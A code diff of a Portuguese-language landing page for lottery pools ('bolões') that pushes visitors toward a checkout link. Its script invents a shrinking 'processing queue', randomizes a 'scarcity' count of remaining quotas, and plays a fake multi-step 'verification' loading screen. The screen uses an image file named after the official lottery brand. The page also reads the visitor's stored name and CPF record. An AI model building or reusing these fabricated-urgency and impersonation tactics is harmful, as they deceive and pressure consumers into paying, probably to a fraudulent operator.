@@ -3,6 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
+
   <title>Prioridade de Processamento</title>
 
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -19,10 +24,11 @@
       --text:#1f2a37;
       --muted:#6b7280;
       --border:#e5e7eb;
-      --danger:#d32f2f;
       --success:#2e7d32;
+      --danger:#d32f2f;
       --shadow:0 10px 24px rgba(0,0,0,.08);
       --radius:14px;
+
       --headerH:120px;
     }
 
@@ -36,23 +42,18 @@
       padding-bottom:40px;
     }
 
-    /* HEADER (neutro) */
+    /* HEADER (mesma ideia dos anteriores: logo + título/linha + data/hora) */
     .header{
-      position:fixed; inset:0 0 auto 0;
-      height:var(--headerH);
-      z-index:999;
-      background:linear-gradient(135deg,var(--primary),var(--primaryDark));
+      position:fixed; top:0; left:0; width:100%; height:var(--headerH); z-index:999;
+      display:flex; align-items:center; justify-content:center;
+      background:linear-gradient(135deg,var(--primary) 0%, var(--primaryDark) 100%);
       box-shadow:0 6px 16px rgba(0,0,0,.12);
-      display:flex;
-      align-items:center;
-      justify-content:center;
       padding:12px 16px;
       text-align:center;
     }
-    .brandWrap{display:flex;flex-direction:column;align-items:center;gap:10px}
-    .brandLogo{
-      width:280px; max-width:82vw; height:auto; max-height:70px;
-      object-fit:contain;
+    .brandWrap{display:flex;flex-direction:column;align-items:center;gap:8px}
+    .brandWrap img{
+      width:280px; max-width:82vw; height:auto; max-height:70px; object-fit:contain;
       filter:drop-shadow(0 2px 4px rgba(0,0,0,.20));
     }
     .headerLine{
@@ -87,7 +88,7 @@
       border:1px solid #d7e8ff;
       border-left:4px solid var(--primary);
       border-radius:12px;
-      padding:14px 14px;
+      padding:14px;
       color:#163a66;
       font-size:14px;
       line-height:1.55;
@@ -102,7 +103,7 @@
       letter-spacing:-.2px;
     }
 
-    /* FILA + ANIMAÇÃO */
+    /* FILA */
     .queueCard{
       background:#fafafa;
       border:1px solid var(--border);
@@ -110,7 +111,6 @@
       padding:16px;
       margin-bottom:18px;
     }
-
     .queueTop{
       display:flex;
       align-items:flex-start;
@@ -121,7 +121,7 @@
     .queueLabel{
       color:var(--muted);
       font-size:13px;
-      font-weight:700;
+      font-weight:800;
     }
     .queueValue{
       font-size:22px;
@@ -136,7 +136,6 @@
       text-align:right;
       margin-top:4px;
     }
-
     .barWrap{
       height:14px;
       background:#e5e7eb;
@@ -148,40 +147,7 @@
       height:100%;
       width:84%;
       background:linear-gradient(135deg,var(--primary),var(--accent));
-      transition:width .4s ease;
-    }
-
-    .queueTicker{
-      margin-top:10px;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:10px;
-      font-size:13px;
-      color:#374151;
-    }
-    .chip{
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      padding:8px 10px;
-      border-radius:999px;
-      background:#fff;
-      border:1px solid var(--border);
-      box-shadow:0 6px 14px rgba(0,0,0,.05);
-      font-weight:800;
-      white-space:nowrap;
-    }
-    .pulseDot{
-      width:10px;height:10px;border-radius:50%;
-      background:var(--success);
-      box-shadow:0 0 0 0 rgba(46,125,50,.45);
-      animation:pulse 1.3s infinite;
-    }
-    @keyframes pulse{
-      0%{box-shadow:0 0 0 0 rgba(46,125,50,.42)}
-      70%{box-shadow:0 0 0 10px rgba(46,125,50,0)}
-      100%{box-shadow:0 0 0 0 rgba(46,125,50,0)}
+      transition:width .35s ease;
     }
 
     /* ESCASSEZ */
@@ -198,7 +164,7 @@
     }
     .scarcity strong{color:var(--danger)}
 
-    /* BLOCOS BOLÃO */
+    /* BLOCOS */
     .blocks{
       display:grid;
       grid-template-columns:1fr;
@@ -209,7 +175,7 @@
       background:#fafafa;
       border:1px solid var(--border);
       border-radius:14px;
-      padding:14px 14px;
+      padding:14px;
     }
     .row{
       display:flex;
@@ -222,7 +188,7 @@
     .label{
       font-size:12px;
       color:var(--muted);
-      font-weight:800;
+      font-weight:900;
       letter-spacing:.2px;
     }
     .value{
@@ -258,6 +224,7 @@
       100%{box-shadow:0 0 0 0 rgba(243,146,0,0)}
     }
 
+    /* CTA */
     .cta{
       width:100%;
       border:none;
@@ -282,6 +249,54 @@
       text-align:center;
     }
 
+    /* ===== LOADING (mantém a tela que você pediu) ===== */
+    #loadingOverlay{
+      display:none;
+      position:fixed;
+      inset:0;
+      background:#fff;
+      z-index:9999;
+      align-items:center;
+      justify-content:center;
+      flex-direction:column;
+      padding:24px;
+      text-align:center;
+    }
+    #loadingOverlay img{
+      width:220px;
+      max-width:80vw;
+      height:auto;
+      margin-bottom:18px;
+    }
+    .progressOuter{
+      width:280px;
+      max-width:86vw;
+      height:10px;
+      background:#e6e8ee;
+      border-radius:999px;
+      overflow:hidden;
+      margin:8px 0 10px;
+    }
+    #progressBar{
+      height:100%;
+      width:0%;
+      background:var(--primary);
+      transition:width .35s ease;
+    }
+    #progressPct{
+      font-size:13px;
+      color:#3b3f46;
+      font-weight:800;
+      margin-top:4px;
+    }
+    #loadingText{
+      margin-top:12px;
+      font-size:14px;
+      color:#4b5563;
+      line-height:1.5;
+      max-width:360px;
+    }
+
     @media(max-width:600px){
       :root{--headerH:110px}
       .headerLine{font-size:18px}
@@ -293,20 +308,19 @@
 
 <body>
 
-  <div class="header">
+  <div class="header" id="header">
     <div class="brandWrap">
       <!-- Use SUA MARCA / logo próprio -->
-      <img class="brandLogo" src="/painel/sucesso/images/logobrancal.png" alt="Plataforma" />
-      <div class="headerLine" id="headerTitle">Prioridade de Processamento</div>
-      <div class="headerMeta" id="headerMeta">—</div>
+      <img id="brandLogo" src="/painel/sucesso/images/logobrancal.png" alt="Plataforma" />
+      <div class="headerLine" id="headerLine">Prioridade de Processamento</div>
+      <div class="headerMeta" id="headerMeta">Verificação de Bolões • —</div>
     </div>
   </div>
 
-  <div class="container">
+  <div class="container" id="pageContainer">
     <div class="main">
-
       <div class="notice">
-        <strong>Atualização automática:</strong> estamos organizando a fila de processamento e validando os registros no sistema.
+        <strong>Atualização automática:</strong> organizando a fila e validando os registros no sistema.
       </div>
 
       <div class="sectionTitle">Fila de processamento</div>
@@ -318,22 +332,17 @@
           </div>
           <div>
             <div class="queueValue" id="queueCount">56.987</div>
-            <div class="queueSub" id="queueHint">atualizando em tempo real</div>
+            <div class="queueSub" id="queueHint">atualiza a cada 15 segundos</div>
           </div>
         </div>
 
         <div class="barWrap">
           <div class="barFill" id="queueBar"></div>
         </div>
-
-        <div class="queueTicker">
-          <div class="chip"><span class="pulseDot"></span> Processando agora</div>
-          <div class="chip" id="leavingChip">—</div>
-        </div>
       </div>
 
       <div class="scarcity" id="scarcityBox">
-        <strong>Escassez:</strong> alguns bolões estão próximos do limite de cotas. Registros sem prioridade podem entrar em ciclos posteriores.
+        <strong>Escassez:</strong> alguns bolões estão próximos do limite de cotas.
       </div>
 
       <div class="sectionTitle">Prioridade de Processamento</div>
@@ -365,6 +374,15 @@
     </div>
   </div>
 
+  <!-- Loading Overlay (mesma ideia, com etapas e barra) -->
+  <div id="loadingOverlay">
+    <!-- Use uma imagem neutra sua (não use marca de terceiros) -->
+    <img src="/painel/sucesso/images/loteriascaixa.svg" alt="Logo" />
+    <div class="progressOuter"><div id="progressBar"></div></div>
+    <div id="progressPct">0%</div>
+    <p id="loadingText">Iniciando verificação…</p>
+  </div>
+
 <script>
   'use strict';
 
@@ -374,12 +392,9 @@
 
   // ====== HELPERS ======
   function pad2(n){ return String(n).padStart(2,'0'); }
-  function formatBRInt(n){
-    try{ return Number(n).toLocaleString('pt-BR'); }catch(e){ return String(n); }
-  }
-  function safeText(v, max=120){
-    return String(v ?? '').replace(/[<>\"']/g,'').substring(0,max);
-  }
+  function formatBRInt(n){ try{ return Number(n).toLocaleString('pt-BR'); }catch(e){ return String(n); } }
+  function safeText(v, max=120){ return String(v ?? '').replace(/[<>\"']/g,'').substring(0,max); }
+
   function formatDateTimeBR(d){
     const dd = pad2(d.getDate());
     const mm = pad2(d.getMonth()+1);
@@ -389,14 +404,17 @@
     return `${dd}/${mm}/${yy}, ${hh}:${mi}`;
   }
 
+  function renderHeader(){
+    const now = new Date();
+    const meta = document.getElementById('headerMeta');
+    if(meta) meta.textContent = `Verificação de Bolões • ${formatDateTimeBR(now)}`;
+  }
+
   function getLeadName(){
-    // tenta achar em chaves comuns
     const nome1 = localStorage.getItem('nome');
     const nome2 = localStorage.getItem('nomeUsuario');
-
     let nome = safeText(nome1 || nome2 || '', 120);
 
-    // tenta dadosUsuario {nome, cpf}
     try{
       const du = JSON.parse(localStorage.getItem('dadosUsuario') || 'null');
       if(!nome && du && du.nome) nome = safeText(du.nome, 120);
@@ -405,59 +423,92 @@
     return nome || 'Participante';
   }
 
-  // ====== HEADER TITLE + DATA/HORA ======
-  function renderHeader(){
-    const now = new Date();
-    document.getElementById('headerMeta').textContent =
-      `Verificação de Bolões • ${formatDateTimeBR(now)}`;
+  // ====== LOADING ======
+  function startLoadingThenShow(){
+    const overlay = document.getElementById('loadingOverlay');
+    const bar = document.getElementById('progressBar');
+    const pct = document.getElementById('progressPct');
+    const txt = document.getElementById('loadingText');
+
+    overlay.style.display = 'flex';
+    bar.style.width = '0%';
+    pct.textContent = '0%';
+
+    let progress = 0;
+    const steps = [
+      'Validando cadastro…',
+      'Conferindo disponibilidade…',
+      'Sincronizando registros…',
+      'Organizando fila de processamento…',
+      'Finalizando verificação…'
+    ];
+
+    const interval = setInterval(()=>{
+      progress += Math.floor(Math.random()*12)+8; // 8–19
+      if(progress > 100) progress = 100;
+
+      bar.style.width = progress + '%';
+      pct.textContent = progress + '%';
+
+      const idx = Math.min(steps.length - 1, Math.floor(progress / 20));
+      txt.textContent = steps[idx];
+
+      if(progress === 100){
+        clearInterval(interval);
+        // fade-out e volta pra tela principal
+        overlay.style.opacity = '1';
+        overlay.style.transition = 'opacity .45s ease';
+
+        setTimeout(()=>{ overlay.style.opacity = '0'; }, 200);
+        setTimeout(()=>{
+          overlay.style.display = 'none';
+          overlay.style.opacity = '1';
+        }, 720);
+      }
+    }, 650);
   }
 
-  // ====== QUEUE ANIMATION ======
+  // ====== QUEUE (15s, -5..-10, sem “saíram X”) ======
   let queue = INITIAL_QUEUE;
   const queueEl = document.getElementById('queueCount');
-  const leavingChip = document.getElementById('leavingChip');
   const queueBar = document.getElementById('queueBar');
 
-  function tickQueue(){
-    // variação de pessoas saindo (mais realista): 37..248
-    const leaving = Math.floor(Math.random() * (248 - 37 + 1)) + 37;
-
-    // impede de ficar negativo e mantém no mínimo “alto”
+  function updateQueue(){
+    const leaving = Math.floor(Math.random() * (10 - 5 + 1)) + 5; // 5..10
     queue = Math.max(1200, queue - leaving);
 
-    queueEl.textContent = formatBRInt(queue);
-    leavingChip.textContent = `Saíram da fila: ${formatBRInt(leaving)}`;
+    if(queueEl) queueEl.textContent = formatBRInt(queue);
 
-    // barra ajusta levemente (não linear)
+    // barra suave (percentual aproximado)
     const pct = Math.max(18, Math.min(92, (queue / INITIAL_QUEUE) * 92));
-    queueBar.style.width = pct.toFixed(0) + '%';
+    if(queueBar) queueBar.style.width = pct.toFixed(0) + '%';
 
-    // “escassez” variando (simples e eficaz)
+    // escassez variando, só pra dar vida
     const scarcityBox = document.getElementById('scarcityBox');
     const left = Math.floor(Math.random() * 14) + 3; // 3..16
-    scarcityBox.innerHTML =
-      `<strong>Escassez:</strong> cotas restantes em alguns bolões: <strong>${left}</strong>. Registros sem prioridade podem entrar em ciclos posteriores.`;
+    if(scarcityBox){
+      scarcityBox.innerHTML =
+        `<strong>Escassez:</strong> cotas restantes em alguns bolões: <strong>${left}</strong>.`;
+    }
   }
 
   // ====== INIT ======
-  document.getElementById('leadNome').textContent = getLeadName();
   renderHeader();
-  tickQueue();
-
-  // Atualiza header a cada minuto
   setInterval(renderHeader, 30 * 1000);
 
-  // Anima fila (intervalo variável para parecer orgânico)
-  function scheduleNextTick(){
-    const ms = Math.floor(Math.random() * (1800 - 900 + 1)) + 900; // 0.9s..1.8s
-    setTimeout(() => {
-      tickQueue();
-      scheduleNextTick();
-    }, ms);
-  }
-  scheduleNextTick();
+  document.getElementById('leadNome').textContent = getLeadName();
 
-  // CTA
+  // Inicializa fila e roda a cada 15s
+  updateQueue();
+  setInterval(updateQueue, 15000);
+
+  // Mostra loading ao entrar e depois some (como você pediu)
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', startLoadingThenShow);
+  }else{
+    startLoadingThenShow();
+  }
+
   document.getElementById('ctaBtn').addEventListener('click', function(){
     window.location.href = CHECKOUT_URL;
   });
